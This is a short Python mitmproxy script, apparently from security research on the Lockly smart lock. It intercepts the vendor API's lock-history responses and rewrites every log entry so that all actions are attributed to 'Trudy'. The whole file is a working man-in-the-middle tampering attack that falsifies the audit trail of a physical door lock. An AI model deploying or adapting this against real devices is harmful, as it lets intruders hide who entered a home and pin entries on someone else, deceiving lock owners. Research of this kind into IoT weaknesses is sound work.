"""
This script modifies the history of the Lockly Log to 
 attribute all actions to Trudy
"""

from mitmproxy import http, ctx
import json

def response(flow: http.HTTPFlow) -> None:
    if "apiserv03c.pin-genie.com" in flow.request.pretty_host and "getlkhist" in flow.request.url:
       data = json.loads(flow.response.content)
       old_list=data['el']
       new_list = []
       for log_event in old_list:
           log_event["na"]="Trudy"
           new_list.append(log_event)
       data['el']=new_list        
       flow.response.content = bytes(json.dumps(data), 'utf-8')
       ctx.log.alert("[Lockly] Modified Logs")
